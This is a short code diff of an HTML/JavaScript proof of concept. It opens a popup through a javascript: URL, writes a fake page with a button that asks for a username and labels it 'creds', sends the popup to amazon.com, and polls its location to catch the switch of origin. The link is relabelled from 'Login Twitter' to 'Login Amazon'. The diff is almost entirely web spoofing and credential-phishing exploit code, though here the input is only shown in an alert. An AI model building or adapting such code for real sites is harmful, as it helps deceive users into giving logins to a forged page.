@@ -4,9 +4,9 @@
   }
 
   function f() {
-    w = window.open("javascript:var name=prompt('What is your name?');alert('Welcome ' + name + ' to Amazon Groot');location='http://amazon.com'","new","width=500,height=500");
-    i = setInterval(\"try { x = w.location.href; } catch(e) { clearInterval(i); next(); }\", 1);
+    w = window.open("javascript:document.write('<h1>I am Groot</h1><button onclick=\"let username = prompt(\\'Enter your username\\'); alert(\\'Your creds:\\nUsername: \\'+ username);\">Click me</button>');location='http://amazon.com'","new","width=500 height=500");
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
   }
 </script>
 
-<a href=\"#\" onclick=\"f()\">Login Twitter</a>
+<a href="#" onclick="f()">Login Amazon</a>
